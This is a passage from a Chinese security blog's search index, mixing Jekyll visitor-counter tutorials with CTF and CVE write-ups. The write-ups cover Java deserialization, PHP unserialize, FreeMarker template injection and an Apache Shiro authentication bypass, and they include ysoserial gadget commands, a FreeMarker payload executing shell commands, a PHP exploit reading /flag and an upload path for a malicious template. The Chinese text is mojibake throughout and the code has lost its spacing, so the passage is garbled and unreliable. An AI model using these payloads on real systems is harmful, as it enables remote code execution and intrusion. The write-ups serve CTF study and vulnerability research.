    "url"      : "/about/2022-11-23-openlitespeed-cve-vuln-walkthrough/",
    "date"     : "Nov 23, 2022",
    "content"  : "[*]MarkCVE-2022-00721æ‰€ç¤ºçš„OpenLiteSpeedWebç›®å½•ç©¿è¶Šæ¼æ´2Githubcommitè®°å½•æ‰€ç¤º3ï¼šRewriteRule4\"RewriteCond%{REQUEST_URI}!^/(index|login)\\\\.php$\\n\"\"RewriteCond%{REQUEST_URI}!^/view/(serviceMgr|confMgr|ajax_data|dashboard|logviewer|compilePHP|realtimestats)\\\\.php$\\n\"\"RewriteRule\\\\.php-[F]\\n\";REFFullDisclosureofCVE-2022-0072,CVE-2022-0073,andCVE-2022-0074andWhatYouShouldDoÂ &#8617;OpenLiteSpeedWebæœåŠ¡å™¨è¢«æ›å¤šä¸ªä¸¥é‡æ€§æ¼æ´Â &#8617;openlitespeed/::1.7.16.1::commitÂ &#8617;Apacheæ­£åˆ™è¡¨è¾¾å¼-RewriteRuleå’ŒRewriteCondè§„åˆ™å‚æ•°çš„è¯¦ç»†ä»‹ç»Â &#8617;"
  },

  {
    "title"    : "ã€ŒJekyllå¼€å‘ç¾åŒ–ã€:å¦‚ä½•æ·»åŠ è®¿å®¢æ¬¡æ•° IIï¼ˆä»¥ç¿»é¡µé’Ÿæ ·å¼ä¸ºä¾‹ï¼‰",
    "category" : "",
    "tags"     : "Development, Jekyll, CSS, JavaScript",
    "url"      : "/blog/2022/Jekyll-devOps-how-to-add-vistor-and-times-II/",
    "date"     : "Nov 21, 2022",
    "content"  : "åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ã€Šã€ŒJekyllå¼€å‘ç¾åŒ–ã€:å¦‚ä½•æ·»åŠ è®¿å®¢æ¬¡æ•°Iã€‹æˆ‘ä»¬å·²ç»å‘æ‚¨ä»‹ç»äº†å¦‚ä½•è·å¾—è®¿å®¢æ¬¡æ•°ï¼Œè¿™ä¸€ç¯‡æˆ‘ä»¬å°†ä¼šæŠŠè¿™äº›æ•°æ®ã€Œæ‚ é›…ã€åœ°åˆ©ç”¨èµ·æ¥ï¼Œæ•ˆæœå¦‚ä¸‹ï¼šå¦‚æœæ‚¨ä¸æ¸…æ¥šå¦‚ä½•è·å¾—è®¿å®¢ï¼Œå¯ä»¥ç§»æ­¥ä¸Šé¢çš„ã€Œå¦‚ä½•æ·»åŠ è®¿å®¢æ¬¡æ•°Iã€é“¾æ¥ã€‚æŠ€æœ¯æ ˆJavaScriptJqueryAjaxCSSFlipClocké¦–å…ˆæˆ‘ä»¬éœ€è¦è·å¾—ä¸€ä¸ªå±•ç¤ºæ•°æ®çš„æ ·å¼ï¼Œæˆ‘ä»¬è¿™é‡Œé€‰æ‹©çš„æ˜¯ç¿»é¡µé’Ÿçš„æ ·å¼ï¼Œè¿™é‡Œæ˜¯objectivehtml/FlipClockä»“åº“é€‰ä¸€ä¸ªæ‚¨å–œæ¬¢çš„æ ·å¼æŠŠæºç è·å–è¿‡æ¥ï¼ˆåˆ«å¿˜äº†ç»™ä¸ªStarï¼‰ï¼šç¬¬ä¸€æ­¥æ–°å»º_includes/extensions/counter.htmlï¼š&lt;!---FlipClockdesign-@link{https://github.com/objectivehtml/FlipClock}--&gt;&lt;linkrel=\"stylesheet\"href=\"/assets/flipclock/flipclock.css\"&gt;&lt;scriptsrc=\"/assets/flipclock/flipclock.js\"&gt;&lt;/script&gt;&lt;script&gt;$(document).ready(function(){//Instantiateacounterclock_counts=1clock=newFlipClock($('.clock'),clock_counts,{clockFace:'Counter'});&lt;/script&gt;æˆ‘ä»¬å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°ç¿»é¡µé’Ÿæ¥æ”¶äº†clock_countså¹¶ä¼ å…¥clockç±»ï¼Œäºæ˜¯æˆ‘ä»¬è¦æƒ³åŠæ³•æŠŠè®¿å®¢å‚æ•°é€šè¿‡ä»£ç çš„æ–¹å¼è·å–åˆ°å¹¶ä¼ åˆ°clocké‡Œå³å¯ã€‚ç¬¬äºŒæ­¥é€šè¿‡æ„å»ºçš„SuperProxy1ä¸­è·å¾—çš„PublicEndpointURL2æ¥å®ç°ç«™ç‚¹è·å–Pageviewsæ•°æ®ï¼Œæ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å¯¹è·å–çš„å‚æ•°è¿›è¡Œå¤„ç†ï¼Œå¯ä»¥å‚è€ƒã€ŒGAEä¸Šåˆ›å»ºæŸ¥è¯¢ã€3è¿›è¡Œè¿™ä¸€æ­¥ï¼Œå¯¹äº†PublicEndpointé•¿è¿™æ ·ï¼šç¬¬ä¸‰æ­¥ç¡®è®¤å®Œæ‚¨åçš„äº†PublicEndpointä¹‹åï¼Œå°†ä»¥ä¸‹ä»£ç åŠ å…¥æ‚¨çš„counter.htmlä¸­ï¼š&lt;script&gt;functiongetGAJson(){letcounts=null$.ajax({url:'yourPublicEndpointURL',dataType:'json',//forcross-originaccesstimeout:1000*10,//10secsasync:false,success:function(data){counts=displayPageviews(data.rows);},error:function(){console.log('FailedtoloadPageviews!');}});returncounts;}functiondisplayPageviews(rows){if(rows===undefined){return;}varcurPath=window.location.pathname;varcurFile=curPath.slice(curPath.lastIndexOf('/')+1);//Sometimespostswillbemoved.varlen=rows.length;varcnt=0;for(vari=0;i&lt;len;++i){vargaPath=rows[i][0];vargaFile=gaPath.slice(gaPath.lastIndexOf('/')+1);if(gaPath===curPath||gaFile===curFile){cnt+=parseInt(rows[i][1]);}}returnsetInitialCount(cnt);//ref@link//-{https://cotes.page/posts/fetch-pageviews-from-google-analytics/#web-%E7%AB%AF%E5%A4%84%E7%90%86-ga-%E6%95%B0%E6%8D%AE}//-{https://taoalpha.github.io/blog/2015/06/07/tech-add-google-analytics-pageviews-to-jekyll-blog/}}//&lt;!--@link{https://profile-counter.glitch.me/bin4xin.github.io/count.svg}--&gt;functionsetInitialCount(num){//varinit_SiteOffset=66749;//_value_site_pv=parseInt(num)//all_counts=init_SiteOffset+_value_site_pv//returnall_counts//å¦‚æœæ‚¨ä¸ä»0å¼€å§‹è®¡æ¬¡ï¼Œä½¿ç”¨ä¸Šé¢çš„ä»£ç ï¼Œå¹¶æ³¨é‡Šæ‰ä¸‹é¢çš„returnreturnnum}&lt;/script&gt;ç„¶åä¼ ç»™clockå°±è¡Œäº†ï¼š&lt;script&gt;letAll_Counts=getGAJson()$(document).ready(function(){//Instantiateacounterclock=newFlipClock($('.clock'),All_Counts,{clockFace:'Counter'});&lt;/script&gt;æ•°æ®æŒä¹…åŒ–å¦‚æœä¸æƒ³å®æ—¶å»è®¿é—®APIï¼Œå¯ä»¥åšä¸€ä¸ªæ•°æ®æŒä¹…åŒ–ï¼Œæˆ‘çš„æ€è·¯æ˜¯è¿™æ ·çš„ï¼šJSONæ–‡ä»¶æœ¬åœ°å­˜å‚¨ActionæŒä¹…å±‚ç¬¬ä¸€æ­¥i.ä¸‹è½½yourPublicEndpointURLçš„JSONæ•°æ®ï¼›ii.ä¿®æ”¹Ajaxä¸­çš„urlä¸ºassets/ga.jsonï¼›ç¬¬äºŒæ­¥i.æ·»åŠ .github/workflows/deploy.yml4curl${{secrets.GA_API}}&gt;assets/ga.jsonii.ä¸ºä»“åº“æ·»åŠ GA_APIsecretsiii.Pushè¿™æ ·æˆ‘ä»¬å°±å®ç°äº†æ•°æ®æŒä¹…åŒ–ï¼Œé˜²æ­¢è¿œç«¯APIçŠ¯ç—…çš„æƒ…å†µï¼ŒåŒæ—¶åŠ å¿«äº†ç«™ç‚¹è®¿é—®é€Ÿåº¦ï¼›åŒæ ·ï¼Œç”±äºGoogleçš„APIæ˜¯æœ‰å…è´¹é¢åº¦çš„ï¼Œåƒï¼šBuildApiæ˜¯ä¸€å¤©2ä¸ªå°æ—¶çš„æ„å»ºæ—¶é•¿ï¼›Appspotsçš„å…è´¹é…é¢å‚è€ƒé…é¢æ­£å¸¸è®¿é—®æ˜¯ä¸ä¼šæœ‰è¿‡æº¢çš„ç°è±¡å¯¼è‡´ä»˜è´¹ï¼Œæ‰€ä»¥åœ¨æµ‹è¯•ä¸­ï¼Œå°½é‡å‡å°‘å¤–åŠ›å¹²æ‰°ã€‚REFã€Šã€ŒJekyllå¼€å‘ç¾åŒ–ã€:å¦‚ä½•æ·»åŠ è®¿å®¢æ¬¡æ•°Iã€‹Â &#8617;ä»GoogleAnalyticsè·å–PageviewsÂ &#8617;GAEä¸Šåˆ›å»ºæŸ¥è¯¢Â &#8617;bin4xin.github.io::deploy.yml#L46Â &#8617;"
  },

  {
    "title"    : "ã€ŒJekyllå¼€å‘ç¾åŒ–ã€:å¦‚ä½•æ·»åŠ è®¿å®¢æ¬¡æ•° I",
    "category" : "",
    "tags"     : "Development, Jekyll, GA, SuperProxy",
    "url"      : "/blog/2022/Jekyll-devOps-how-to-add-vistor-and-times-I/",
    "date"     : "Nov 18, 2022",
    "content"  : "æˆ‘ä»¬å·²ç»è¿«ä¸åŠå¾…åœ°å‘æ‚¨ä»‹ç»è¿™äº›â€è¿‡æ—¶çš„æŠ€æœ¯â€ï¼šå¤§è‡´æ€è·¯1ï¼šé€šè¿‡GoogleAppEngineæ­å»ºsuperProxy,å¼€å¯å…¶GAæƒé™;è®¾ç½®å¯¹åº”æŸ¥è¯¢queryä»¥åŠæ›´æ–°é¢‘ç‡;è·å–jsonç»“æœç”Ÿæˆåœ°å€;é€šè¿‡jsè¯·æ±‚è·å–jsonæ•°æ®,è§£æå±•ç°;åŠ å…¥æœ¬åœ°pageviewæ–‡ä»¶å¤‡ä»½å®¹é”™;æŠ€æœ¯æ ˆGoogleAppspotGoogleAppengineBuildApiæ„å»ºsuperProxyGoogleAnalyticsApisuperProxyæ¥å…¥AnalyticsApiï¼Œæ‹¿åˆ°Analyticsæ•°æ®ç»™superProxyæ·»åŠ ä¸€ä¸ªç§æœ‰åŸŸï¼ˆè®¤è¯ï¼‰åœ¨APIAccesspaneä¸­åˆ›å»ºä¸€ä¸ªOAuthåŸºæœ¬æ–¹æ³•1å¯ä»¥å‚è€ƒï¼šã€Šå¦‚ä½•ç»™Jekyllåšæ–‡æ·»åŠ é˜…è¯»æ•°æ˜¾ç¤ºã€‹æˆ‘è¿™å„¿æ ¹æ®è¿‡ç¨‹æä¾›ä¸€äº›è¿‡æ¥å»ºè®®ã€‚BUILD[Permissionserror]Pleasemakesurethatyouhavepermissiontoviewapplicationsontheprojectandthat**@**.comhastheAppEngineDeployer(roles/appengine.deployer)role.å¦‚ä¸Šï¼ŒæŠ¥AppEngineDeployer(roles/appengine.deployer)role.çš„é”™ï¼Œä¹Ÿå°±æ˜¯æ„å»ºè€…æƒé™çš„é—®é¢˜ï¼›ç¬¬ä¸€æ­¥ï¼šéœ€è¦è¿›å…¥GoogleClouddashboardæŸ¥çœ‹æ‚¨æ˜¯å¦å¼€å¯äº†Buildçš„Apiåœ¨ã€å·²å¯ç”¨çš„APIå’ŒæœåŠ¡ä¸­ã€‘æ‰¾ã€CloudBuildApiã€‘ï¼Œæ²¡æœ‰å¼€å¯å¯ä»¥æœç´¢BuildApiæŠŠå¥¹å¼€å¯ï¼šç¬¬äºŒæ­¥ï¼šè¿›å…¥iamadminpanelæ‰¾åˆ°ç»ˆç«¯æŠ¥æƒé™é”™è¯¯çš„ç”¨æˆ·ï¼Œç»™è¿™ä¸ªç”¨æˆ·èµ‹æƒï¼Œï¼ˆå°±æ˜¯è¯´è¿™ä¸ªç”¨æˆ·ç°åœ¨æ²¡æœ‰æ„å»ºçš„æƒé™ï¼Œæˆ‘ä»¬ç»™å¥¹èµ‹ä¸Šæƒå°±è¡Œï¼‰ï¼Œåœ¨è¿™é‡Œçš„ç¤ºä¾‹å°±æ˜¯***@**.comæ‰¾åˆ°ã€AppEngineã€‘ä¸‹çš„ã€Deployerã€‘æƒé™ï¼šBUILD[invalid_client]{u'error_description':u'Unauthorized',u'error':u'invalid_client'}æ„å»ºå®Œæˆåï¼Œè®¿é—®superProxyï¼Œè¿”å›invalid_clientã€‚ç¬¬ä¸€æ­¥è¿›å…¥Gcloudã€å‡­æ®æœåŠ¡ã€‘ï¼Œæ‰¾åˆ°æ–°å»ºçš„OAuth2.0å®¢æˆ·ç«¯ID-&gt;ã€é‡ç½®Secretã€‘ï¼›ç¬¬äºŒæ­¥ä¿æŒapis/credentialsè·å¾—çš„ä¸¤ä¸ªSecretä¸Buildçš„ä»£ç ï¼šhttps://{your-app-id}.appspot.comä¸src/config.pyä¸­OAUTH_REDIRECT_URIä¿æŒä¸€è‡´Build[fetchingapplication]ERROR:(gcloud.app.deploy)Permissionserrorfetchingapplication[apps/**-your-**-project**].Pleasemakesurethatyouhavepermissiontoviewapplicationsontheprojectandthat***@**.comhastheAppEngineDeployer(roles/appengine.deployer)role.ç¬¬ä¸€æ­¥å¦‚æœæŠ¥çš„æƒé™é”™è¯¯æ˜¯è·Ÿapplicationæœ‰å…³ï¼Œè·Ÿç”¨æˆ·æ— å…³ï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡æ˜¯æ‚¨çš„æœ¬åœ°sdké…ç½®å­˜åœ¨é…ç½®é—®é¢˜2ï¼šè¿›å…¥ã€appengineã€‘-&gt;headerå¤„ã€é€‰æ‹©é¡¹ç›®ã€‘ï¼Œè€Œé’ˆå¯¹æ­¤é”™è¯¯éœ€è¦ä¿®æ”¹æ‚¨æœ¬åœ°é»˜è®¤project-idï¼Œidå‚è€ƒå¦‚ä¸‹ï¼šå¸Œæœ›èƒ½å¤Ÿå¸®åŠ©æ‚¨åœ¨æ„å»ºAppspot/æ„å»ºsuperProxy/OAuthæ—¶å¸®åˆ°æ‚¨ï¼Œå¦‚æœæœ‰ä»»ä½•é—®é¢˜è¯·åœ¨ä¸‹æ–¹ç‚¹å‡»needhelpæäº¤issuesã€‚REFã€Šå¦‚ä½•ç»™Jekyllåšæ–‡æ·»åŠ é˜…è¯»æ•°æ˜¾ç¤ºã€‹Â &#8617;Â &#8617;2AppEngineé”™è¯¯é—®é¢˜æ’æŸ¥Â &#8617;"
  },

  {
    "title"    : "2022å¹´ç½‘é¼æ¯ç„æ­¦ç»„èµ›é¢˜å¤ç›˜-[Web-ezJava]",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/WANGDINGCTF2022-WEB-ezJava-Walkthrough/",
    "date"     : "Nov 5, 2022",
    "content"  : "Web-ezJavaèµ›é¢˜å¤ç›˜è·¯ç”±ç»•è¿‡payloadhttp://localhost/;Evilç»•è¿‡if(path.startsWith(\"/Evil\"))@ResponseBody@RequestMapping({\"/Evil\"})publicStringEvil(HttpServletRequestrequest,HttpServletResponseresponse)throwsIOException,ClassNotFoundException{Stringpath=request.getRequestURI();if(path.startsWith(\"/Evil\"))return\"nonono!!!\";Stringbase=request.getParameter(\"base\");EInputStreamin=newEInputStream(newByteArrayInputStream(Base64.getDecoder().decode(base)));Objecta=in.readObject();return\"OK\";}EInputStreamEInputStreamin=newEInputStream(newByteArrayInputStream(Base64.getDecoder().decode(base)));æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è·¯ç”±ä¸‹base64è§£ç äº†baseå‚æ•°ï¼Œå¹¶ä¼ ç»™äº†EInputStreamï¼Œè€Œæˆ‘ä»¬æœ¬åœ°è°ƒè¯•ä¿®æ”¹æˆObjectInputStream1ï¼šObjectInputStreamin=newObjectInputStream(newByteArrayInputStream(Base64.getDecoder().decode(base)));å¯ä»¥ç›´æ¥RCEï¼šæ‰€ä»¥å¯ä»¥çœ‹åˆ°,æœ‰å¾ˆæ˜æ˜¾çš„ååºåˆ—åŒ–çš„åœ°æ–¹ï¼Œä¸è¿‡éœ€è¦åšä¸€äº›ç»•è¿‡ï¼Œé€šè¿‡é‡å†™ObjectInputStream::resolveClassæ–¹æ³•æ¥å®ç°çš„2ï¼›GadgetURLDNSä½¿ç”¨URLDNSGadgetæµ‹è¯•ä¸€ä¸‹ï¼šjava-jarysoserial.jarJRMPClient\"localhost:1099\"|base64java-cpysoserial.jarysoserial.exploit.JRMPListener1099URLDNS\"http://dnslog\"æ”»å‡»æˆåŠŸï¼šMorevideoinfoforabove:YouTubeBiliBiliä¸è‰¯è§†é¢‘åé¦ˆ&nbsp;|&nbsp;Inappropriatevideofeedback.RCEæ‰€ä»¥ä¸ºäº†RCEå»æŸ¥çœ‹äº†libï¼Œæœ¬åœ°æœåŠ¡æ²¡æœ‰å¯ä»¥ç›´æ¥è°ƒç”¨çš„Gadgetï¼Œå°è¯•ä¸€äº›ccGadgetå‘ç°æŠ¥é”™ï¼šERROR1---[nio-8080-exec-9]o.a.c.c.C.[.[.[/].[dispatcherServlet]:Servlet.service()forservlet[dispatcherServlet]incontextwithpath[]threwexception[Requestprocessingfailed;nestedexceptionisjava.lang.IllegalArgumentException:Illegalbase64character20]withrootcausejava.lang.IllegalArgumentException:Illegalbase64character20\tatjava.util.Base64$Decoder.decode0(Base64.java:714)~[na:1.8.0_171]Â·Â·Â·Â·Â·Â·\tatjava.lang.Thread.run(Thread.java:748)[na:1.8.0_171]è§£æ³•æˆ‘ä»¬å›å¤´çœ‹ä¾èµ–ï¼š&lt;dependency&gt;&lt;groupId&gt;com.alibaba&lt;/groupId&gt;&lt;artifactId&gt;fastjson&lt;/artifactId&gt;&lt;version&gt;1.2.48&lt;/version&gt;&lt;/dependency&gt;æ‰¾åˆ°æ•™ç¨‹è¯´æ˜¯é€šè¿‡FastJsonè¿›è¡ŒäºŒæ¬¡ååºåˆ—åŒ–3addpayloaderror[ERROR]/Users/bin4xin/.../FastJson.java:[3,27]é”™è¯¯:ç¨‹åºåŒ…com.alibaba.fastjsonä¸å­˜åœ¨æ·»åŠ jaråˆ°æœ¬åœ°ä»“åº“mvninstall:install-file-Dfile=/Users/bin4xin/path/to/fastjson-1.2.48.jar-DgroupId=com.alibaba-DartifactId=fastjson-Dversion=1.2.48-Dpackaging=jarjava-jarysoserial-0.0.6-SNAPSHOT-all.jarYSOSERIAL?Usage:java-jarysoserial-[version]-all.jar[payload]'[command]'Â·Â·Â·FastJsonÂ·Â·Â·JRMPClient_bypass_jep_jdk241expjava-jarysoserial-0.0.6-SNAPSHOT-all.jarJRMPClient_bypass_jep_jdk241\"127.0.0.1:1099\"|base64java-cpysoserial-0.0.6-SNAPSHOT-all.jarysoserial.exploit.JRMPListener1099FastJson\"open/System/Applications/Calculator.app\"è°ƒç”¨ï¼šjavax.management.BadAttributeValueExpException#readObjectcom.alibaba.fastjson.JSON#toJSONStringcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputPropertiesæŠ¥é”™ï¼šServlet.service()forservlet[dispatcherServlet]incontextwithpath[]threwexception[Requestprocessingfailed;nestedexceptionisjava.lang.IllegalArgumentException:Illegalbase64character20]withrootcausejava.lang.IllegalArgumentException:Illegalbase64character20atjava.util.Base64$Decoder.decode0(Base64.java:714)~[na:1.8.0_181]è§£å†³ï¼šæˆåŠŸï¼šREFä»¥ä¸Šï¼Œå®Œç»“ã€‚EasySpringMVCï¼ˆjavaååºåˆ—åŒ–ï¼‰Â &#8617;JRMPå®‰å…¨é—®é¢˜åˆ†æ-ä»CVEåˆ°CTFÂ &#8617;javaäºŒæ¬¡ååºåˆ—åŒ–åˆæ¢Â &#8617;"
  },

  {
    "title"    : "2022å¹´å…¨çœé€šä¿¡å’Œäº’è”ç½‘è¡Œä¸šèŒä¸šæŠ€èƒ½ç«èµ› WriteUp",
    "category" : "",
    "tags"     : "CTF, WriteUp",
    "url"      : "/blog/2022/Provincial-Communication-and-Internet-Industry-Vocational-Skills-Competition/",
    "date"     : "Nov 4, 2022",
    "content"  : "#1.WebPHPserializeååºåˆ—åŒ–è€ƒç‚¹ï¼›é¢˜æ„ï¼šå®šä¹‰äº†ä¸¤ä¸ªclassï¼ŒclassAæ˜¯å»æ‰¾ä¼ å…¥è¿›æ¥çš„æ–‡ä»¶ä½ç½®å¹¶åšifå­˜åœ¨åˆ¤æ–­ï¼Œè¿‡ç¨‹ä¸­å¯¹$filepathåšbase64è§£ç ï¼›classA{public$files;publicfunctionfindFile(){echo$this-&gt;files;if(file_exists(base64_decode($this-&gt;files-&gt;filepath))){echo\"Thisisafile\";}else{echo\"Filenotfound\";}}publicfunction__destruct(){$this-&gt;findFile();}}ç¬¬äºŒä¸ªclassBæ˜¯å¯¹ä¼ å…¥çš„$filepathåšäº†ä¸€ä¸ªç®€å•çš„è¿‡æ»¤åˆ¤æ–­ï¼Œå¦‚æœä¼ å…¥çš„å­—ç¬¦ç¬¦åˆ/flagï¼Œé‚£ä¹ˆå°±ç›´æ¥é€€å‡ºæŠ¥die(\"no\")ï¼›classB{public$filepath;publicfunctionshutdown(){die(\"no\");}publicfunction__toString(){$result=$this-&gt;filepath;if(strstr($result,\"L2ZsYWc\")||strlen($result)&gt;8){$this-&gt;shutdown();}$result=base64_decode($result);$content=file_get_contents($result);echo$content;return\"\";}}æœ€åå°±é’ˆå¯¹ä¼ å…¥çš„å‚æ•°åšååºåˆ—åŒ–ï¼š@$a=$_GET['a'];@unserialize(base64_decode($a));æ‰€ä»¥å®šä¹‰ä¸¤ä¸ªå‡½æ•°ä¼ å…¥$filepathï¼Œåºåˆ—åŒ–åå¯¹å­—ç¬¦ä¸²è¿›è¡Œbase64ç¼–ç å³å¯ï¼šexp&lt;?phpclassA{public$files;}classB{public$filepath;}$a=newA();$b=newB();$a-&gt;files=$b;$b-&gt;filepath=\"Ly9mbGFn\";echobase64_encode(serialize($a));?&gt;php7exp.php#2.WebFunnyJavaé¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªJaråŒ…ï¼›IDEAå¼•ç”¨libç›´æ¥åç¼–è¯‘ç›´æ¥å®šä½Controllerï¼šSearchControllerFunnyJava.jar!/BOOT-INF/classes/com/funnnyjava/Controller/Search.class@RequestMapping(value={\"/search\"},method={RequestMethod.GET,RequestMethod.POST})@ResponseBodypublicStringsearch(HttpServletRequestrequest,HttpServletResponseresponse){Stringsearch=request.getParameter(\"search\");if(search==null){search=\"search.html\";}Â·Â·Â·returncontent;}ä¸€ä¸ª/SearchåŠŸèƒ½ï¼Œæä¾›searchå‚æ•°è¿”å›ç›¸å…³å†…å®¹ï¼›è§£ææ¨¡ç‰ˆå¯ä»¥é€šè¿‡ä»¥ä¸‹ç±»ä¸­çœ‹åˆ°1ï¼šFunnyJava.jar!/BOOT-INF/classes/com/funnnyjava/util/ParserUtil.classStringbuildTempletPath=BasicUtil.getRealPath(context,\"\")+\"templates\"+File.separator;EditorControllerç¬¬äºŒä¸ªæ˜¯ä¸€ä¸ªueditorçš„è·¯ç”±å®šä¹‰ï¼š@RequestMapping({\"/static/plugins/ueditor/{version}/jsp\"})Â·Â·Â·{Â·Â·Â·@RequestMapping({\"editor\"})publicStringeditor(HttpServletRequestrequest,HttpServletResponseresponse,StringjsonConfig){Â·Â·Â·}}åº”è¯¥æ˜¯ä¸€ä¸ªä¸Šä¼ åŠŸèƒ½çš„è·¯ç”±å®šä¹‰ï¼Œä½†æ˜¯æˆ‘ä»¬çœ‹å®Œä¸¤ä¸ªControllerè¿˜æš‚æ—¶æ²¡æœ‰æ€è·¯ï¼Œä¸Šä¼ ç‚¹è¿™é‡Œæˆ‘ä»¬æš‚æ—¶æ”¾ä¸‹ä¸è¡¨ï¼›è§£é¢˜æ€è·¯SearchåŠŸèƒ½æˆ‘ä»¬å¯ä»¥çœ‹åˆ°é»˜è®¤è§£æçš„æ˜¯webappä¸­çš„search.htmlå¹¶è¿”å›ï¼›Editorä¸Šä¼ åŠŸèƒ½ä¹Ÿæœ‰å¯èƒ½æˆ‘ä»¬æ‰¾åˆ°ä¸Šä¼ ç‚¹ï¼Œå¯ä»¥ç›´æ¥getshellï¼›æ‰€ä»¥ç›®å‰æœ‰ä¸¤ä¸ªæ€è·¯ï¼šæ€è·¯ä¸€ï¼šSearchç›´æ¥æ¨¡ç‰ˆè§£æRCEï¼›æ€è·¯äºŒï¼šEditorä¸Šä¼ getShellï¼›æœ¬åœ°è°ƒè¯•æ€è·¯ä¸€ï¼šimportfreemarker.core.ParseException;importfreemarker.template.MalformedTemplateNameException;importfreemarker.template.TemplateNotFoundException;æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœç´¢åŠŸèƒ½ä¸‹å¯¼å…¥çš„æ¨¡ç‰ˆè§£æåº“ï¼›æˆ‘ä»¬æœç´¢å…³é”®è¯Freemarkeræ¨¡æ¿æ³¨å…¥ï¼Œå¯ä»¥çœ‹åˆ°ç½‘ä¸Šå¾ˆå¤šç›¸å…³æ–‡ç« ï¼Œè€Œä¸”åœ¨JaråŒ…ä¸­å…¶å®ä¹Ÿç»™äº†æˆ‘ä»¬æç¤ºï¼šFunnyJava.jar!/BOOT-INF/classes/templates/1647232439869.htmæˆ‘ä»¬ç›´æ¥æœ¬åœ°èµ·ç¯å¢ƒï¼ŒæŠŠä»£ç æ”¾åˆ°æ¨¡ç‰ˆä½ç½®ï¼ŒæŸ¥çœ‹è¿è¡Œæƒ…å†µï¼š&lt;#assignexec=\"freemarker.template.utility.Execute\"?new()&gt;${exec(\"id\")}æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ¨¡ç‰ˆè§£æRCEã€‚æ‰€ä»¥æ€è·¯ä¸€æ²¡é—®é¢˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æ€ä¹ˆæŠŠæˆ‘ä»¬ç”Ÿæˆçš„æ¨¡ç‰ˆè®©æœåŠ¡å™¨å»æ‰§è¡Œå‘¢ï¼Ÿæ€è·¯äºŒï¼šæ˜¾ç„¶ï¼Œéœ€è¦é€šè¿‡ueditorçš„ä¸Šä¼ åŠŸèƒ½ä¸Šä¼ åˆ°webapp/templatesç›®å½•ä¸‹ï¼ˆå‰é¢å·²ç»è§£é‡Šç›®å½•æ¥æºï¼‰ï¼Œç„¶åé€šè¿‡searchåŠŸèƒ½æ¥è§£ææˆ‘ä»¬çš„æ¶æ„æ¨¡ç‰ˆæ¥è¾¾åˆ°RCEçš„ç›®çš„ï¼›ä¸Šä¼ ç‚¹çªç ´æˆ‘ä»¬é€šè¿‡å‰é¢Editorçš„è·¯ç”±å®šä¹‰æ¥æ‰¾åˆ°è·¯ç”±å¦‚ä½•è®¿é—®ï¼Œå¹¶å®šä¹‰ç›¸å…³å‚æ•°ä¸Šä¼ æˆ‘ä»¬çš„æ¨¡ç‰ˆï¼šæ ¹æ®@RequestMappingçš„å®šä¹‰å’Œueditorçš„ç›¸å…³ç”¨æ³•ï¼Œæ‰¾åˆ°ä¸Šä¼ çš„è·¯ç”±ä¸ºï¼šhttp://localhost:8080/static/plugins/ueditor/1.4.3.3/jsp/editor?action=uploadimagepayloadï¼š&lt;formaction=\"http://localhost:8080/static/plugins/ueditor/1.4.3.3/jsp/editor?action=uploadimage\"method=\"post\"enctype=\"multipart/form-data\"&gt;&lt;div&gt;&lt;inputtype=\"file\"multiple=\"multiple\"accept=\"image/*\"name=\"image\"&gt;&lt;/div&gt;&lt;div&gt;&lt;inputtype=\"submit\"value=\"ä¸Šä¼ \"&gt;&lt;/div&gt;&lt;/form&gt;ä¸è¿‡æ„é€ å®Œpayloadä¸Šä¼ åä¼šä¸€ç›´æç¤ºIOé”™è¯¯ï¼›è€ƒè™‘æœ‰å¯èƒ½æ˜¯å†™å…¥æ–‡ä»¶æ ¼å¼ä¸æ­£ç¡®ï¼›REFFreeMarkeræ¨¡æ¿å¼€å‘ä¸­StringTemplateLoaderçš„ç”¨æ³•Â &#8617;"
  },

  {
    "title"    : "CVE-2022-40664 Shiro Bypassç ”ç©¶å†ç¨‹",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/CVE-2022-40664-Research-Walkthrough/",
    "date"     : "Oct 26, 2022",
    "content"  : "ApacheShirobefore1.10.0,AuthenticationBypassVulnerabilityinShirowhenforwardingorincludingviaRequestDispatcher.1YouTubeBiliBiliä¸è‰¯è§†é¢‘åé¦ˆ&nbsp;|&nbsp;Inappropriatevideofeedback.walkthrough2GET/admin/auth_passHTTP/1.1GET/admin/authHTTP/1.1GET/admin/authHTTP/1.1Token:4ra1nexchangeredirectfromforward?3@RequestMapping(\"/admin/{value}\")publicStringCVE_2022_40664_bypass(@PathVariableStringvalue,HttpServletRequestrequest,HttpServletResponseresponse)throwsServletException,IOException{System.out.println(\"===========/admin\"+((HttpServletRequest)request).getRequestURI()+\"/===========\");//request.getRequestDispatcher(\"/admin/auth\").forward(request,response);//return\"forward:\"+((HttpServletRequest)request).getRequestURI();response.sendRedirect(\"/admin/auth\");return(\"Redirect:/admin/auth\");}forward4request.getRequestDispatcher(\"/admin/auth\").forward(request,response);shiro1.10.0DefineBean5SecurityManager6@BeanpublicMyShiroFilterFactoryBeanfilterRegBean(SecurityManagersecurityManager)throwsException{//CVE-2022-40664//fixedconfShiroFilterConfigurationconf=newShiroFilterConfiguration();conf.setFilterOncePerRequest(false);ShiroFilterFactoryBeanshiroFilterFactoryBean=newShiroFilterFactoryBean();shiroFilterFactoryBean.setSecurityManager(securityManager);shiroFilterFactoryBean.setShiroFilterConfiguration(conf);AbstractShiroFilterfilter=shiroFilterFactoryBean.getObject();MyShiroFilterFactoryBeanreg=newMyShiroFilterFactoryBean();reg.setFilter(filter);reg.addUrlPattern(\"/*\");reg.setName(\"shiroFilter\");reg.setSecurityManager(securityManager);reg.setDispatcherTypes(EnumSet.allOf(DispatcherType.class));//fixedconfend.returnreg;}Donotwork.reference[ANNOUNCE][CVE-2022-32532]ApacheShiro1.9.1releasedÂ &#8617;Lay0us1/CVE-2022-32532Â &#8617;CVE-2022-40664Â &#8617;Shiro1.7å’Œ1.10å¯¹äºforwardè¯·æ±‚çš„å¤„ç†Â 